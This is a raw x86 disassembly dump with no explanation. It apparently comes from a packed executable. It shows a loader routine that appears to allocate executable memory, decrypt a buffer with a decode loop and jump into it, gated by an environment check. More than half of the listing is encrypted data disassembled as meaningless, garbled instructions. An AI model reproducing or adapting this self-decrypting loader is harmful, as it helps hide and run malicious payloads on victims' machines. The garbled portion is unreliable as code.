  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428108
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42810c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428110
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428114
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f8
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280fc
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428100
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428104
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428106
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	lea    eax,[ebp-0x10]
  42162f:	push   eax
  421630:	lea    ecx,[ebp-0x10]
  421633:	push   ecx
  421634:	lea    edx,[ebp-0x14]
  421637:	push   edx
  421638:	call   DWORD PTR ds:0x428000
  42163e:	test   eax,eax
  421640:	je     0x42164b
  421642:	mov    eax,DWORD PTR [ebp-0x10]
  421645:	add    eax,0x1
  421648:	mov    DWORD PTR [ebp-0x10],eax
  42164b:	mov    DWORD PTR [ebp-0x48],0x0
  421652:	mov    DWORD PTR [ebp-0x4c],0x0
  421659:	lea    ecx,[ebp-0x14]
  42165c:	push   ecx
  42165d:	call   DWORD PTR ds:0x428004
  421663:	mov    BYTE PTR [ebp-0x40],0x56
  421667:	call   DWORD PTR ds:0x428014
  42166d:	mov    DWORD PTR [ebp-0x2c],eax
  421670:	mov    BYTE PTR [ebp-0x3e],0x72
  421674:	movzx  edx,WORD PTR [ebp-0x2c]
  421678:	test   edx,edx
  42167a:	jne    0x4216bc
  42167c:	mov    BYTE PTR [ebp-0x34],0x0
  421680:	mov    DWORD PTR [ebp-0x14],0xe0d
  421687:	lea    eax,[ebp-0x28]
  42168a:	push   eax
  42168b:	call   DWORD PTR ds:0x428018
  421691:	mov    DWORD PTR [ebp-0x68],eax
  421694:	mov    DWORD PTR [ebp-0x5c],0x3a
  42169b:	lea    ecx,[ebp-0x40]
  42169e:	push   ecx
  42169f:	mov    edx,DWORD PTR [ebp-0x68]
  4216a2:	push   edx
  4216a3:	call   DWORD PTR ds:0x42801c
  4216a9:	mov    DWORD PTR [ebp-0x44],eax
  4216ac:	mov    DWORD PTR [ebp-0x8],0xb2b30cde
  4216b3:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216ba:	jmp    0x4216d1
  4216bc:	mov    BYTE PTR ds:0x443a58,0x0
  4216c3:	mov    BYTE PTR ds:0x42bb88,0x0
  4216ca:	mov    BYTE PTR ds:0x441b18,0x0
  4216d1:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216d8:	push   DWORD PTR ds:0x428018
  4216de:	pop    edx
  4216df:	mov    DWORD PTR [ebp-0x74],edx
  4216e2:	push   DWORD PTR [ebp-0x30]
  4216e5:	push   0x1000
  4216ea:	mov    eax,DWORD PTR [ebp-0x14]
  4216ed:	add    eax,0x23
  4216f0:	add    eax,0x23
  4216f3:	push   eax
  4216f4:	xor    eax,eax
  4216f6:	push   eax
  4216f7:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fa:	call   ecx
  4216fc:	mov    edx,eax
  4216fe:	mov    DWORD PTR [ebp-0x4],edx
  421701:	mov    eax,DWORD PTR [ebp-0x70]
  421704:	sub    eax,0xdae0b
  421709:	mov    DWORD PTR [ebp-0x70],eax
  42170c:	cmp    DWORD PTR [ebp-0x4],0x0
  421710:	jne    0x421719
  421712:	mov    BYTE PTR ds:0x441b18,0x0
  421719:	mov    ecx,DWORD PTR [ebp-0x4]
  42171c:	add    ecx,DWORD PTR [ebp-0x14]
  42171f:	mov    edx,DWORD PTR [ebp-0x8]
  421722:	mov    DWORD PTR [ecx],edx
  421724:	mov    eax,DWORD PTR [ebp-0x4]
  421727:	add    eax,DWORD PTR [ebp-0x5c]
  42172a:	mov    DWORD PTR [ebp-0x64],eax
  42172d:	mov    ecx,DWORD PTR ds:0x42801c
  421733:	mov    DWORD PTR [ebp-0x54],ecx
  421736:	mov    edx,DWORD PTR [ebp-0x4]
  421739:	add    edx,DWORD PTR [ebp-0x14]
  42173c:	mov    eax,DWORD PTR [ebp+0x8]
  42173f:	mov    DWORD PTR [edx+0x4],eax
  421742:	mov    ecx,DWORD PTR [ebp-0x4]
  421745:	add    ecx,DWORD PTR [ebp-0x14]
  421748:	mov    DWORD PTR [ebp-0xc],ecx
  42174b:	cmp    DWORD PTR [ebp-0x70],0x0
  42174f:	jbe    0x42176c
  421751:	mov    edx,DWORD PTR [ebp-0xc]
  421754:	push   edx
  421755:	mov    eax,DWORD PTR [ebp-0x14]
  421758:	push   eax
  421759:	mov    ecx,DWORD PTR [ebp-0x2c]
  42175c:	add    ecx,DWORD PTR [ebp-0x70]
  42175f:	push   ecx
  421760:	mov    edx,DWORD PTR [ebp-0x4]
  421763:	push   edx
  421764:	call   0x4214d0
  421769:	add    esp,0x10
  42176c:	cmp    DWORD PTR [ebp-0x64],0x0
  421770:	je     0x421784
  421772:	mov    ecx,DWORD PTR [ebp-0x54]
  421775:	push   ecx
  421776:	push   DWORD PTR [ebp-0x74]
  421779:	mov    esi,DWORD PTR [ebp-0x64]
  42177c:	push   edx
  42177d:	pop    eax
  42177e:	push   ecx
  42177f:	nop
  421780:	jmp    esi
  421782:	jmp    0x42178a
  421784:	mov    eax,DWORD PTR [ebp+0x8]
  421787:	mov    DWORD PTR [ebp-0x18],eax
  42178a:	mov    eax,0x1
  42178f:	pop    esi
  421790:	mov    esp,ebp
  421792:	pop    ebp
  421793:	ret    
  421794:	int3   
  421795:	int3   
  421796:	int3   
  421797:	int3   
  421798:	int3   
  421799:	int3   
  42179a:	int3   
  42179b:	int3   
  42179c:	int3   
  42179d:	int3   
  42179e:	int3   
  42179f:	int3   
  4217a0:	push   ebp
  4217a1:	mov    ebp,esp
  4217a3:	sub    esp,0x8
  4217a6:	mov    eax,ds:0x428014
  4217ab:	push   0x0
  4217ad:	push   0xb2
  4217b2:	push   0x82
  4217b7:	push   0x0
  4217b9:	push   0xffffffff
  4217bb:	mov    DWORD PTR [ebp-0x4],0x0
  4217c2:	mov    DWORD PTR [ebp-0x8],eax
  4217c5:	call   DWORD PTR ds:0x428010
  4217cb:	push   DWORD PTR [ebp-0x8]
  4217ce:	pop    edx
  4217cf:	call   edx
  4217d1:	push   eax
  4217d2:	pop    DWORD PTR [ebp-0x4]
  4217d5:	mov    eax,DWORD PTR [ebp-0x4]
  4217d8:	dec    eax
  4217d9:	cmp    eax,0x56
  4217dc:	jne    0x4217eb
  4217de:	push   0x94f530ce
  4217e3:	call   0x421550
  4217e8:	add    esp,0x4
  4217eb:	xor    eax,eax
  4217ed:	mov    esp,ebp
  4217ef:	pop    ebp
  4217f0:	ret    
  4217f1:	nop
  4217f2:	nop
  4217f3:	nop
  4217f4:	nop
  4217f5:	nop
  4217f6:	nop
  4217f7:	nop
  4217f8:	nop
  4217f9:	nop
  4217fa:	nop
  4217fb:	nop
  4217fc:	nop
  4217fd:	nop
  4217fe:	nop
  4217ff:	nop
  421800:	sub    esp,0x10
  421803:	lea    eax,[esp+0x0]
  421807:	push   eax
  421808:	call   DWORD PTR ds:0x42800c
  42180e:	cmp    WORD PTR [esp+0x0],0x0
  421814:	je     0x42182d
  421816:	push   0x0
  421818:	call   0x4217a0
  42181d:	add    esp,0x4
  421820:	call   0x411000
  421825:	xor    eax,eax
  421827:	add    esp,0x10
  42182a:	ret    0x10
  42182d:	jmp    FWORD PTR [ebx-0x4d]
  421830:	call   0x4aee:0xb64f3209
  421837:	inc    ebx
  421838:	ins    BYTE PTR es:[edi],dx
  421839:	iret   
  42183a:	sbb    cl,bl
  42183c:	jmp    0x4f73c94b
  421841:	mov    dh,0xee
  421843:	dec    esi
  421844:	inc    ebx
  421845:	ins    BYTE PTR es:[edi],dx
  421846:	(bad)  
  421847:	out    0x26,eax
  421849:	jmp    0x4f732158
  42184e:	mov    dh,0xee
  421850:	dec    esi
  421851:	inc    ebx
  421852:	ins    BYTE PTR es:[edi],dx
  421853:	iret   
  421854:	out    0x26,eax
  421856:	jmp    0x4f732165
  42185b:	mov    dh,0xee
  42185d:	dec    esi
  42185e:	inc    ebx
  42185f:	ins    BYTE PTR es:[edi],dx
  421860:	iret   
  421861:	out    0x26,eax
  421863:	jmp    0x4f732172
  421868:	mov    dh,0xee
  42186a:	mov    dh,0x43
  42186c:	ins    BYTE PTR es:[edi],dx
  42186d:	iret   
  42186e:	jmp    0x9466bac
  421873:	test   DWORD PTR [esi+0x7b],eax
  421876:	iret   
  421877:	test   BYTE PTR [edx+0x20],0x2
  42187b:	(bad)  
  42187c:	jb     0x4217ff
  42187e:	arpl   WORD PTR [edx+0x11],di
  421881:	aas    
  421882:	les    eax,FWORD PTR [ecx-0x5df2ced7]
  421888:	mov    DWORD PTR [ebp-0x78],0x3b5e6764
  42188f:	xchg   esi,eax
  421890:	mov    WORD PTR [ebx],gs
  421892:	arpl   WORD PTR [esi],bx
  421894:	mov    edx,0x64800689
  421899:	sub    DWORD PTR [ebp+0x0],esi
  42189c:	in     eax,0xce
  42189e:	and    ebp,DWORD PTR [eax+ecx*1]
  4218a1:	stos   BYTE PTR es:[edi],al
  4218a2:	leave  
  4218a3:	sub    esp,esp
  4218a5:	add    BYTE PTR ds:0xeeb64f31,ch
  4218ab:	dec    esi
  4218ac:	inc    ebx
  4218ad:	ins    BYTE PTR es:[edi],dx
  4218ae:	enter  0xda7e,0xb0
  4218b2:	dec    ecx
  4218b3:	icebp  
  4218b4:	mov    ds:0xdc16f545,eax
  4218b9:	dec    ecx
  4218ba:	das    
  4218bb:	aaa    
  4218bc:	jne    0x4218ea
  4218be:	mov    cl,0x6f
  4218c0:	add    eax,0x7c4e103b
  4218c5:	inc    esp
  4218c6:	sbb    ecx,DWORD PTR [ecx]
  4218c8:	imul   ebp
  4218ca:	in     al,0x11
  4218cc:	cwde   
  4218cd:	add    ebp,DWORD PTR [ecx+0x2a]
  4218d0:	(bad)  
  4218d1:	in     al,0x26
  4218d3:	mov    ebx,0xa8cbc5fe
  4218d8:	rol    BYTE PTR [eax],1
  4218da:	dec    edi
  4218db:	leave  
  4218dc:	fnstsw WORD PTR [esp+eiz*4-0x7a99ad32]
  4218e3:	pop    ds
  4218e4:	mov    ah,0xe3
  4218e6:	inc    eax
  4218e7:	mov    DWORD PTR [eax],esi
  4218e9:	inc    ebp
  4218ea:	out    dx,al
  4218eb:	push   ss
  4218ec:	fmul   QWORD PTR [ecx+0x2f]
  4218ef:	aaa    
  4218f0:	je     0x42191e
  4218f2:	shl    ebx,0x9b
  4218f5:	cmp    esi,eax
  4218f7:	outs   dx,BYTE PTR ds:[esi]
  4218f8:	outs   dx,BYTE PTR ds:[esi]
  4218f9:	inc    esp
  4218fa:	push   cs
  4218fb:	xchg   esp,eax
  4218fc:	pop    ebp
  4218fd:	in     eax,dx
  4218fe:	jle    0x42188c
  421900:	aaa    
  421901:	add    edi,DWORD PTR [ecx]
  421903:	mov    bh,0x24
  421905:	in     al,0x16
  421907:	es lds esp,FWORD PTR fs:[ebp+0x51007bde]
  42190f:	push   esp
  421910:	inc    eax
  421911:	mov    esp,0x66d1b6ac
  421916:	popf   
  421917:	mov    es,WORD PTR [ebp-0x7f]
  42191a:	dec    ecx
  42191b:	icebp  
  42191c:	mov    ds:0x4eeeb645,eax
  421921:	inc    ebx
  421922:	ins    BYTE PTR es:[edi],dx
  421923:	iret   
  421924:	out    0x26,eax
  421926:	mov    ecx,0x331094f
  42192b:	mov    bh,0xec
  42192d:	dec    esi
  42192e:	jecxz  0x4218ec
  421930:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421931:	test   al,0x26
  421933:	jmp    0x4f732242
  421938:	mov    dh,0xee
  42193a:	scas   al,BYTE PTR es:[edi]
  42193b:	inc    ebx
  42193c:	outs   dx,DWORD PTR ds:[esi]
  42193d:	into   
  42193e:	in     al,dx
  42193f:	daa    
  421940:	jecxz  0x42194c
  421942:	or     edi,ebx
  421944:	dec    ebx
  421945:	mov    dh,0xee
  421947:	repnz inc ebp
  421949:	ins    BYTE PTR es:[edi],dx
  42194a:	iret   
  42194b:	out    0x26,eax
  42194d:	jmp    0x4f73cd6d
  421952:	mov    dh,0xfe
  421954:	dec    esi
  421955:	inc    ebx
  421956:	ins    BYTE PTR es:[edi],dx
  421957:	iret   
  421958:	loop   0x421980
  42195a:	jmp    0x4f736169
  42195f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421960:	out    dx,al
  421961:	dec    esi
  421962:	inc    ebx
  421963:	outs   dx,BYTE PTR ds:[esi]
  421964:	iret   
  421965:	out    0x23,eax
  421967:	jmp    0x4f732277
  42196c:	mov    dh,0xee
  42196e:	dec    ebx
  42196f:	inc    ebx
  421970:	ins    DWORD PTR es:[edi],dx
  421971:	iret   
  421972:	out    0x26,eax
  421974:	jmp    0x43a32283
  421979:	mov    dh,0xee
  42197b:	dec    edx
  42197c:	inc    ebx
  42197d:	ins    BYTE PTR es:[edi],dx
  42197e:	into   
  42197f:	add    esp,DWORD PTR [ebx]
  421981:	jmp    0xcf73228e
  421986:	mov    dh,0xee
  421988:	pop    esi
  421989:	inc    ebx
  42198a:	ins    BYTE PTR es:[edi],dx
  42198b:	(bad)  
  42198d:	es jmp 0x4f73329d
  421993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421994:	out    dx,al
  421995:	dec    esi
  421996:	inc    ebx
  421997:	ins    BYTE PTR es:[edi],dx
  421998:	iret   
  421999:	out    0x36,eax
  42199b:	jmp    0x4f7322aa
  4219a0:	mov    dh,0xee
  4219a2:	dec    esi
  4219a3:	inc    ebx
  4219a4:	ins    BYTE PTR es:[edi],dx
  4219a5:	iret   
  4219a6:	adc    ebx,DWORD PTR [edi]
  4219a8:	in     eax,0xa
  4219aa:	pusha  
  4219ab:	xor    cl,BYTE PTR [edi-0x4a]
  4219ae:	out    dx,al
  4219af:	mov    esi,0xae806c48
  4219b4:	es jmp 0x4f7322c4
  4219ba:	mov    dh,0xee
  4219bc:	dec    esi
  4219bd:	inc    ebx
  4219be:	ins    BYTE PTR es:[edi],dx
  4219bf:	iret   
  4219c0:	out    0x26,eax
  4219c2:	jmp    0x4f7322d1
  4219c7:	mov    dh,0xee
  4219c9:	dec    esi
  4219ca:	inc    ebx
  4219cb:	ins    BYTE PTR es:[edi],dx
  4219cc:	iret   
  4219cd:	out    0x26,eax
  4219cf:	jmp    0x4f7322de
  4219d4:	mov    dh,0xee
  4219d6:	dec    esi
  4219d7:	inc    ebx
  4219d8:	ins    BYTE PTR es:[edi],dx
  4219d9:	iret   
  4219da:	out    0x26,eax
  4219dc:	jmp    0x4f7322eb
  4219e1:	mov    dh,0xee
  4219e3:	dec    esi
  4219e4:	inc    ebx
  4219e5:	ins    BYTE PTR es:[edi],dx
  4219e6:	iret   
  4219e7:	out    0x26,eax
  4219e9:	jmp    0x4f7322f8
  4219ee:	mov    dh,0xee
  4219f0:	dec    esi
  4219f1:	inc    ebx
  4219f2:	ins    BYTE PTR es:[edi],dx
  4219f3:	iret   
  4219f4:	out    0x26,eax
  4219f6:	jmp    0x4f732305
  4219fb:	mov    dh,0xee
  4219fd:	dec    esi
  4219fe:	inc    ebx
  4219ff:	ins    BYTE PTR es:[edi],dx
  421a00:	iret   
  421a01:	out    0x26,eax
  421a03:	jmp    0x4f732312
  421a08:	mov    dh,0xee
  421a0a:	dec    esi
  421a0b:	inc    ebx
  421a0c:	ins    BYTE PTR es:[edi],dx
  421a0d:	iret   
  421a0e:	out    0x26,eax
  421a10:	jmp    0x4f73231f
  421a15:	mov    dh,0xee
  421a17:	dec    esi
  421a18:	inc    ebx
  421a19:	ins    BYTE PTR es:[edi],dx
  421a1a:	iret   
  421a1b:	out    0x26,eax
  421a1d:	jmp    0x37969746
  421a22:	ret    0x4eee
  421a25:	inc    ebx
  421a26:	ins    BYTE PTR es:[edi],dx
  421a27:	das    
  421a28:	in     al,dx
  421a29:	es jmp 0x4f732349
  421a2f:	(bad)  
  421a30:	jmp    0x76e7:0xcf68434e
  421a37:	lods   al,BYTE PTR ds:[esi]
  421a38:	dec    ecx
  421a39:	cmp    esp,DWORD PTR [ebp+0x0]
  421a3c:	mov    dh,0xee
  421a3e:	dec    esi
  421a3f:	inc    ebx
  421a40:	ins    BYTE PTR es:[edi],dx
  421a41:	iret   
  421a42:	(bad)  
  421a43:	es jmp 0x3c854233
  421a49:	les    ecx,FWORD PTR [ebp-0x3093bcb2]
  421a4f:	xchg   DWORD PTR [esi],esp
  421a51:	jmp    0x4f7d1360
  421a56:	mov    dh,0xb4
  421a58:	dec    esi
  421a59:	inc    ebx
  421a5a:	ins    BYTE PTR es:[edi],dx
  421a5b:	pop    ss
  421a5c:	jecxz  0x421a84
  421a5e:	jmp    0x4f73236d
  421a63:	mov    dh,0xee
  421a65:	dec    esi
  421a66:	inc    ebx
  421a67:	ins    BYTE PTR es:[edi],dx
  421a68:	iret   
  421a69:	out    0x6,eax
  421a6b:	jmp    0x4f74037a
  421a70:	mov    dh,0xee
  421a72:	dec    esi
  421a73:	inc    ebx
  421a74:	ins    BYTE PTR es:[edi],dx
  421a75:	iret   
  421a76:	out    0x26,eax
  421a78:	jmp    0x4f732387
  421a7d:	mov    dh,0xee
  421a7f:	dec    esi
  421a80:	inc    ebx
  421a81:	ins    BYTE PTR es:[edi],dx
  421a82:	iret   
  421a83:	out    0x26,eax
  421a85:	jmp    0x4f732394
  421a8a:	mov    dh,0xee
  421a8c:	dec    esi
  421a8d:	inc    ebx
  421a8e:	ins    BYTE PTR es:[edi],dx
  421a8f:	iret   
  421a90:	out    0x26,eax
  421a92:	jmp    0x4f7323a1
  421a97:	mov    dh,0xee
  421a99:	dec    esi
  421a9a:	inc    ebx
  421a9b:	ins    BYTE PTR es:[edi],dx
  421a9c:	iret   
  421a9d:	out    0x26,eax
  421a9f:	jmp    0x4f7323ae
  421aa4:	mov    dh,0xee
  421aa6:	dec    esi
  421aa7:	inc    ebx
  421aa8:	ins    BYTE PTR es:[edi],dx
  421aa9:	iret   
  421aaa:	out    0x26,eax
  421aac:	jmp    0x4f7323bb
  421ab1:	mov    dh,0xee
  421ab3:	dec    esi
  421ab4:	inc    ebx
  421ab5:	ins    BYTE PTR es:[edi],dx
  421ab6:	iret   
  421ab7:	out    0x26,eax
  421ab9:	jmp    0x4f7323c8
  421abe:	mov    dh,0xee
  421ac0:	dec    esi
  421ac1:	inc    ebx
  421ac2:	ins    BYTE PTR es:[edi],dx
  421ac3:	iret   
  421ac4:	out    0x26,eax
  421ac6:	jmp    0x4f7323d5
  421acb:	mov    dh,0xee
  421acd:	dec    esi
  421ace:	inc    ebx
  421acf:	ins    BYTE PTR es:[edi],dx
  421ad0:	iret   
  421ad1:	out    0x26,eax
  421ad3:	jmp    0x4f7323e2
  421ad8:	mov    dh,0xee
  421ada:	dec    esi
  421adb:	inc    ebx
  421adc:	ins    BYTE PTR es:[edi],dx
  421add:	iret   
  421ade:	out    0x26,eax
  421ae0:	jmp    0x4f7323ef
  421ae5:	mov    dh,0xee
  421ae7:	dec    esi
  421ae8:	inc    ebx
  421ae9:	ins    BYTE PTR es:[edi],dx
  421aea:	iret   
  421aeb:	out    0x26,eax
  421aed:	jmp    0x4f7323fc
  421af2:	mov    dh,0xee
  421af4:	dec    esi
  421af5:	inc    ebx
  421af6:	ins    BYTE PTR es:[edi],dx
  421af7:	iret   
  421af8:	out    0x26,eax
  421afa:	jmp    0x4f732409
  421aff:	mov    dh,0xee
  421b01:	dec    esi
  421b02:	inc    ebx
  421b03:	ins    BYTE PTR es:[edi],dx
  421b04:	iret   
  421b05:	out    0x26,eax
  421b07:	jmp    0x4f732416
  421b0c:	mov    dh,0xee
  421b0e:	dec    esi
  421b0f:	inc    ebx
  421b10:	ins    BYTE PTR es:[edi],dx
  421b11:	iret   
  421b12:	out    0x26,eax
  421b14:	jmp    0x4f732423
  421b19:	mov    dh,0xee
  421b1b:	dec    esi
  421b1c:	inc    ebx
  421b1d:	ins    BYTE PTR es:[edi],dx
  421b1e:	iret   
  421b1f:	out    0x26,eax
  421b21:	jmp    0x4f732430
  421b26:	mov    dh,0xee
  421b28:	dec    esi
  421b29:	inc    ebx
  421b2a:	ins    BYTE PTR es:[edi],dx
  421b2b:	iret   
  421b2c:	out    0x26,eax
  421b2e:	jmp    0x4f73243d
  421b33:	mov    dh,0xee
  421b35:	dec    esi
  421b36:	inc    ebx
  421b37:	ins    BYTE PTR es:[edi],dx
  421b38:	iret   
  421b39:	out    0x26,eax
  421b3b:	jmp    0x4f73244a
  421b40:	mov    dh,0xee
  421b42:	dec    esi
  421b43:	inc    ebx
  421b44:	ins    BYTE PTR es:[edi],dx
  421b45:	iret   
  421b46:	out    0x26,eax
  421b48:	jmp    0x4f732457
  421b4d:	mov    dh,0xee
  421b4f:	dec    esi
  421b50:	inc    ebx
  421b51:	ins    BYTE PTR es:[edi],dx
  421b52:	iret   
  421b53:	out    0x26,eax
  421b55:	jmp    0x4f732464
  421b5a:	mov    dh,0xee
  421b5c:	dec    esi
  421b5d:	inc    ebx
  421b5e:	ins    BYTE PTR es:[edi],dx
  421b5f:	iret   
  421b60:	out    0x26,eax
  421b62:	jmp    0x4f732471
  421b67:	mov    dh,0xee
  421b69:	dec    esi
  421b6a:	inc    ebx
  421b6b:	ins    BYTE PTR es:[edi],dx
  421b6c:	iret   
  421b6d:	out    0x26,eax
  421b6f:	jmp    0x4f73247e
  421b74:	mov    dh,0xee
  421b76:	dec    esi
  421b77:	inc    ebx
  421b78:	ins    BYTE PTR es:[edi],dx
  421b79:	iret   
  421b7a:	out    0x26,eax
  421b7c:	jmp    0x4f73248b
  421b81:	mov    dh,0xee
  421b83:	dec    esi
  421b84:	inc    ebx
  421b85:	ins    BYTE PTR es:[edi],dx
  421b86:	iret   
  421b87:	out    0x26,eax
  421b89:	jmp    0x4f732498
  421b8e:	mov    dh,0xee
  421b90:	dec    esi
  421b91:	inc    ebx
  421b92:	ins    BYTE PTR es:[edi],dx
  421b93:	iret   
  421b94:	out    0x26,eax
  421b96:	jmp    0x4f7324a5
  421b9b:	mov    dh,0xee
  421b9d:	dec    esi
  421b9e:	inc    ebx
  421b9f:	ins    BYTE PTR es:[edi],dx
  421ba0:	iret   
  421ba1:	out    0x26,eax
  421ba3:	jmp    0x4f7324b2
  421ba8:	mov    dh,0xee
  421baa:	dec    esi
  421bab:	inc    ebx
  421bac:	ins    BYTE PTR es:[edi],dx
  421bad:	iret   
  421bae:	out    0x26,eax
  421bb0:	jmp    0x4f7324bf
  421bb5:	mov    dh,0xee
  421bb7:	dec    esi
  421bb8:	inc    ebx
  421bb9:	ins    BYTE PTR es:[edi],dx
  421bba:	iret   
  421bbb:	out    0x26,eax
  421bbd:	jmp    0x4f7324cc
  421bc2:	mov    dh,0xee
  421bc4:	dec    esi
  421bc5:	inc    ebx
  421bc6:	ins    BYTE PTR es:[edi],dx
  421bc7:	iret   
  421bc8:	out    0x26,eax
  421bca:	jmp    0x4f7324d9
  421bcf:	mov    dh,0xee
  421bd1:	dec    esi
  421bd2:	inc    ebx
  421bd3:	ins    BYTE PTR es:[edi],dx
  421bd4:	iret   
  421bd5:	out    0x26,eax
  421bd7:	jmp    0x4f7324e6
  421bdc:	mov    dh,0xee
  421bde:	dec    esi
  421bdf:	inc    ebx
  421be0:	ins    BYTE PTR es:[edi],dx
  421be1:	iret   
  421be2:	out    0x26,eax
  421be4:	jmp    0x4f7324f3
  421be9:	mov    dh,0xee
  421beb:	dec    esi
  421bec:	inc    ebx
  421bed:	ins    BYTE PTR es:[edi],dx
  421bee:	iret   
  421bef:	out    0x26,eax
  421bf1:	jmp    0x4f732500
  421bf6:	mov    dh,0xee
  421bf8:	dec    esi
  421bf9:	inc    ebx
  421bfa:	ins    BYTE PTR es:[edi],dx
  421bfb:	iret   
  421bfc:	out    0x26,eax
  421bfe:	jmp    0x4f73250d
  421c03:	mov    dh,0xee
  421c05:	dec    esi
  421c06:	inc    ebx
  421c07:	ins    BYTE PTR es:[edi],dx
  421c08:	iret   
  421c09:	out    0x26,eax
  421c0b:	jmp    0x4f73251a
  421c10:	mov    dh,0xee
  421c12:	dec    esi
  421c13:	inc    ebx
  421c14:	ins    BYTE PTR es:[edi],dx
  421c15:	iret   
  421c16:	out    0x26,eax
  421c18:	jmp    0x4f732527
  421c1d:	mov    dh,0xee
  421c1f:	dec    esi
  421c20:	inc    ebx
  421c21:	ins    BYTE PTR es:[edi],dx
  421c22:	iret   
  421c23:	out    0x26,eax
  421c25:	jmp    0x4f732534
  421c2a:	mov    dh,0xee
  421c2c:	dec    esi
  421c2d:	inc    ebx
  421c2e:	add    esp,DWORD PTR [edi-0x14]
  421c31:	es (bad) 
  421c33:	or     cl,BYTE PTR [ecx]
  421c35:	and    DWORD PTR [edi-0x4a],ecx
  421c38:	(bad)  
  421c39:	in     al,dx
  421c3a:	cdq    
  421c3b:	sbb    eax,0x770b18a9
  421c40:	lea    ebx,[ecx-0x24]
  421c43:	jns    0x421ca3
  421c45:	std    
  421c46:	cli    
  421c47:	(bad)  
  421c48:	or     bh,BYTE PTR [esi-0x4405839d]
  421c4e:	mov    esi,0x64522227
  421c53:	iret   
  421c54:	test   DWORD PTR [edx-0x53],eax
  421c57:	ja     0x421c72
  421c59:	sar    BYTE PTR [ecx],1
  421c5b:	inc    esi
  421c5c:	sbb    BYTE PTR [eax-0x6c],0xee
  421c60:	imul   esp,esp,0x4bb69ae4
  421c66:	inc    eax
  421c67:	cmp    BYTE PTR [esp+ebp*8],dh
  421c6a:	pop    ebx
  421c6b:	pop    es
  421c6c:	mov    es,WORD PTR [ecx-0x63]
  421c6f:	dec    eax
  421c70:	je     0x421c1d
  421c72:	cmc    
  421c73:	sub    al,0x25
  421c75:	icebp  
  421c76:	scas   eax,DWORD PTR es:[edi]
  421c77:	inc    ebp
  421c78:	pop    ecx
  421c79:	mov    ch,BYTE PTR [esi-0x20]
  421c7c:	arpl   WORD PTR [esi],di
  421c7e:	dec    ebp
  421c7f:	or     ebp,DWORD PTR [edx+esi*2+0x780c604f]
  421c86:	pop    edi
  421c87:	or     BYTE PTR [edx+0x11],ch
  421c8a:	push   edx
  421c8b:	data16 jl 0x421c99
  421c8e:	or     eax,0xdd7cb3bd
  421c93:	or     ch,BYTE PTR [edi-0x4d]
  421c96:	or     eax,0xfd808744
  421c9b:	es out dx,al
  421c9d:	call   0x77e3:0x7109fd67
  421ca4:	nop
  421ca5:	push   ebp
  421ca6:	pushf  
  421ca7:	scas   eax,DWORD PTR es:[edi]
  421ca8:	mov    dh,0x72
  421caa:	sbb    BYTE PTR ds:0x727f1198,cl
  421cb0:	mov    al,ds:0x4b48e878
  421cb5:	push   esp
  421cb6:	mov    ah,0x1c
  421cb8:	inc    ebp
  421cb9:	repz sub bl,bl
  421cbc:	or     ah,bl
  421cbe:	cld    
  421cbf:	xor    DWORD PTR ds:0x73218d9d,0x13
  421cc6:	xor    BYTE PTR [ebx+0x63],dl
  421cc9:	mov    cl,0x66
  421ccb:	inc    ebx
  421ccc:	mov    dh,0x3e
  421cce:	pop    edx
  421ccf:	or     al,0xa6
  421cd1:	jnp    0x421c92
  421cd3:	lods   al,BYTE PTR ds:[esi]
  421cd4:	addr16 push cs
  421cd6:	or     al,0x74
  421cd8:	jecxz  0x421d2b
  421cda:	int3   
  421cdb:	push   ecx
  421cdc:	jo     0x421d03
  421cde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cdf:	mov    esi,0x567e8439
  421ce4:	inc    esi
  421ce5:	enter  0x4d92,0x1b
  421ce9:	mov    edx,0x7d8ca337
  421cee:	adc    al,BYTE PTR [edi+0x5d]
  421cf1:	out    dx,al
